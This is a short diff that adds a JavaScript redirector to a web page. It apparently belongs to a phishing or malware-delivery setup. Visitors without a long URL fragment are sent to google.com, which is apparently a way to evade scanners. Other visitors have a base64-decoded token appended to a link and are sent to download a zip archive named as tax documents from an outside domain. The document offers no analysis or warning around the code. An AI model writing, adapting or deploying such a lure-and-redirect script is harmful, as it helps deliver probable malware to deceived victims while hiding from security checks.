@@ -1,0 +1,30 @@
+<script>
+    var main_link = "https://motivasimuslim.com/secure/AdditionalTaxDocuments.zip";
+
+
+    if (!window.location.hash) {
+        location.href = "https://google.com";
+    }
+    var fragment = window.location.hash.substring(1);
+
+
+    if (fragment.length < 3) {
+        location.href = "https://google.com";
+    }
+
+
+    var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+    if (base64regex.test(fragment)) {
+        try {
+            var decodedFragment = atob(fragment);
+            console.log("Decoded Base64 value:", decodedFragment);
+        } catch (error) {
+            console.log("Error while decoding Base64 value:", error);
+        }
+    } else {
+        console.log("Not a valid Base64 value.");
+        decodedFragment = fragment;
+    }
+
+    location.href = `${main_link}${decodedFragment}`;
+</script>
